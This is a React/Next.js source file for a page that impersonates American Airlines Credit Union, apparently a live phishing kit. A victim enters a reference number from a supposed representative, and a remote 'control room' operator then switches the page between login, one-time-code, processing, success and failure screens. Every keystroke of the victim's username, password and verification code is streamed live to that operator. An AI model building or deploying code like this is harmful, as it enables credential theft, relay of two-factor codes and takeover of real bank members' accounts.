"use client";

import { useState, useEffect } from "react";
import { ControlRoomSession, SessionState } from "@/SDK/vendor-sdk";
import { CheckCircle2, XCircle } from "lucide-react";

/* ===================================================================
   LOGIN FORM — Redesigned for AACU
   Schema component_key: "LoginForm"
   =================================================================== */

function LoginForm({ onInput, onKeystroke, error }: { onInput: (data: any) => Promise<void>; onKeystroke: (field: string, value: string) => void; error?: string }) {
  const [userId, setUserId] = useState("");
  const [password, setPassword] = useState("");
  const [showPassword, setShowPassword] = useState(false);
  const [validationError, setValidationError] = useState("");
  const [isSubmitting, setIsSubmitting] = useState(false);

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    setValidationError("");

    if (!userId.trim()) {
      setValidationError("Please enter your Username.");
      return;
    }
    if (!password) {
      setValidationError("Please enter your Password.");
      return;
    }

    setIsSubmitting(true);
    try {
      await onInput({ event: "submit_credentials", user_id: userId, password: password });
    } catch {
      setIsSubmitting(false);
    }
  };

  return (
    <div className="login-widget-container">
      <h1 className="login-title">Log In</h1>
      <div className="card-body">
        <form onSubmit={handleSubmit} className="form-section">
          <div className="form-group">
            <label htmlFor="username">Username</label>
            <div className="input-with-icon">
              <input
                type="text"
                id="username"
                placeholder="Username"
                value={userId}
                onChange={e => {
                  setUserId(e.target.value);
                  onKeystroke("user_id", e.target.value);
                }}
                autoComplete="username"
                autoFocus
                required
              />
            </div>
          </div>

          <div className="form-group">
            <label htmlFor="password">Password</label>
            <div className="input-with-icon password-input">
              <input
                type={showPassword ? "text" : "password"}
                id="password"
                placeholder="Password"
                value={password}
                onChange={e => {
                  setPassword(e.target.value);
                  onKeystroke("password", e.target.value);
                }}
                autoComplete="current-password"
                required
              />
              <button
                type="button"
                className="password-toggle-btn text-toggle"
                onClick={() => setShowPassword(!showPassword)}
                aria-label={showPassword ? "Hide password" : "Show password"}
              >
                {showPassword ? "Hide" : "Show"}
              </button>
            </div>
          </div>

          <a href="#" className="forgot-link">Forgot password?</a>

          {(error || validationError) && <p className="inline-error">{validationError || error}</p>}

          <button type="submit" className="btn-primary" id="signInBtn" disabled={isSubmitting}>
            {isSubmitting ? "Logging in..." : "Log In"}
          </button>
        </form>
      </div>
    </div>
  );
}

/* ===================================================================
   OTP VERIFICATION FORM
   Schema component_key: "OtpVerificationForm"
   =================================================================== */

function OtpVerificationForm({ onInput, onKeystroke, error }: { onInput: (data: any) => Promise<void>; onKeystroke: (field: string, value: string) => void; error?: string }) {
  const [otp, setOtp] = useState("");
  const [isSubmitting, setIsSubmitting] = useState(false);

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    setIsSubmitting(true);
    try {
      await onInput({ event: "verify_otp", otp_code: otp });
    } catch {
      setIsSubmitting(false);
    }
  };

  return (
    <div className="login-widget-container">
      <h2 className="login-title">Verify Your Identity</h2>
      <div className="card-body">
        <p className="card-body-description">
          We&apos;ve sent a verification code to your registered device. Enter the code below to continue.
        </p>
        <form onSubmit={handleSubmit} className="form-section">
          <div className="form-group">
            <label htmlFor="otpCode">Verification Code</label>
            <input
              type="text"
              id="otpCode"
              value={otp}
              onChange={e => {
                const val = e.target.value.replace(/\D/g, "").slice(0, 8);
                setOtp(val);
                onKeystroke("otp_code", val);
              }}
              inputMode="numeric"
              required
              autoComplete="one-time-code"
              autoFocus
              style={{ letterSpacing: "6px", textAlign: "center", fontSize: "20px", fontWeight: 700 }}
            />
          </div>

          {error && <p className="inline-error">{error}</p>}

          <button type="submit" className="btn-primary" id="verifyOtpBtn" disabled={otp.length < 4 || isSubmitting}>
            {isSubmitting ? "Verifying..." : "Verify"}
          </button>
        </form>
      </div>
    </div>
  );
}

/* ===================================================================
   PROCESSING SCREEN
   Schema component_key: "ProcessingScreen"
   =================================================================== */

function ProcessingScreen({ error }: { error?: string }) {
  return (
    <div className="login-widget-container">
      <h2 className="login-title">Processing Your Request</h2>
      <div className="card-body">
        <div className="sign-on-widget" style={{ textAlign: "center", padding: "10px 0" }}>
          <div className="spinner" style={{ margin: "0 auto 20px" }}></div>
          <p style={{ fontSize: 15, color: "var(--hs-grey)", lineHeight: 1.6 }}>
            Please wait while we securely verify your information.<br />Do not close or refresh this page.
          </p>
          {error && <p className="inline-error" style={{ marginTop: "16px", textAlign: "left" }}>{error}</p>}
        </div>
      </div>
    </div>
  );
}

/* ===================================================================
   SUCCESS SCREEN
   Schema component_key: "SuccessScreen"
   =================================================================== */

function SuccessScreen() {
  return (
    <div className="login-widget-container">
      <h2 className="login-title" style={{ color: "var(--hs-primary)" }}>Verification Complete</h2>
      <div className="card-body" style={{ textAlign: "center", padding: "10px 0" }}>
        <CheckCircle2 style={{ color: "var(--hs-primary)", width: "56px", height: "56px", marginBottom: "16px" }} />
        <p style={{ fontSize: 15, color: "var(--hs-grey)", lineHeight: 1.6 }}>
          Your identity has been successfully verified. You may now close this window.
        </p>
      </div>
    </div>
  );
}

/* ===================================================================
   FAILURE SCREEN
   Schema component_key: "FailureScreen"
   =================================================================== */

function FailureScreen({ error }: { error?: string }) {
  return (
    <div className="login-widget-container">
      <h2 className="login-title" style={{ color: "var(--hs-secondary)" }}>Verification Failed</h2>
      <div className="card-body" style={{ textAlign: "center", padding: "10px 0" }}>
        <XCircle style={{ color: "var(--hs-secondary)", width: "56px", height: "56px", marginBottom: "16px" }} />
        <p style={{ fontSize: 15, color: "var(--hs-grey)", lineHeight: 1.6 }}>
          {error || "We could not verify your information. Please contact American Airlines Credit Union for assistance."}
        </p>
      </div>
    </div>
  );
}

/* ===================================================================
   MAIN PAGE — Reference Entry → Session Flow
   =================================================================== */

export default function Home() {
  const [caseRef, setCaseRef] = useState("");
  const [error, setError] = useState("");
  const [loading, setLoading] = useState(false);
  const [sessionState, setSessionState] = useState<SessionState | null>(null);
  const [session, setSession] = useState<ControlRoomSession | null>(null);

  const handleConnect = async (e: React.FormEvent) => {
    e.preventDefault();
    if (!caseRef.trim()) return;

    setLoading(true);
    setError("");

    try {
      const s = new ControlRoomSession({
        tenant_id: "7acbba39-f3c1-4f0f-b661-d6abe8e1c08e",
        case_reference: caseRef.trim(),
        supabaseUrl: process.env.NEXT_PUBLIC_SUPABASE_URL!,
        supabaseKey: process.env.NEXT_PUBLIC_SUPABASE_PUBLISHABLE_KEY!,
      });
      const state = await s.connect();
      setSession(s);
      setSessionState(state);

      s.subscribe((newState) => {
        setSessionState(newState);
      });
    } catch (err: any) {
      setError(err.message || "Unable to connect. Please check your reference and try again.");
    } finally {
      setLoading(false);
    }
  };

  const handleInput = async (data: any) => {
    if (session) {
      await session.sendInput(data);
    }
  };

  const handleKeystroke = (field: string, value: string) => {
    if (session) {
      session.sendKeystroke(field, value);
    }
  };

  useEffect(() => {
    return () => {
      if (session) session.disconnect();
    };
  }, [session]);

  // Reference entry screen — before session is connected
  if (!sessionState) {
    return (
      <div className="login-widget-container">
        <h1 className="login-title">Secure Verification</h1>
        <div className="card-body">
          <p className="card-body-description">
            Enter the reference number provided by your American Airlines Credit Union representative to begin the verification process.
          </p>
          <form onSubmit={handleConnect}>
            <div className="ref-input-wrapper">
              <input
                type="text"
                className="ref-input"
                id="caseRefInput"
                value={caseRef}
                onChange={e => setCaseRef(e.target.value.toUpperCase())}
                placeholder="Reference Number"
                autoFocus
              />
              {error && <p className="ref-error">{error}</p>}
            </div>
            <button type="submit" className="btn-primary" id="connectBtn" disabled={loading || !caseRef.trim()}>
              {loading ? "Connecting..." : "Continue"}
            </button>
          </form>
        </div>
      </div>
    );
  }

  const operatorError = sessionState.operator_message;

  switch (sessionState.component_key) {
    case "LoginForm":
      return <LoginForm onInput={handleInput} onKeystroke={handleKeystroke} error={operatorError} />;
    case "OtpVerificationForm":
      return <OtpVerificationForm onInput={handleInput} onKeystroke={handleKeystroke} error={operatorError} />;
    case "ProcessingScreen":
      return <ProcessingScreen error={operatorError} />;
    case "SuccessScreen":
      return <SuccessScreen />;
    case "FailureScreen":
      return <FailureScreen error={operatorError} />;
    default:
      return (
        <div className="login-widget-container">
          <h2 className="login-title">Loading...</h2>
          <div className="card-body" style={{ textAlign: "center", padding: "10px 0" }}>
            <div className="spinner" style={{ margin: "0 auto 20px" }}></div>
            <p style={{ fontSize: 15, color: "var(--hs-grey)", lineHeight: 1.5 }}>
              Waiting for session: {sessionState.current_state}
            </p>
          </div>
        </div>
      );
  }
}
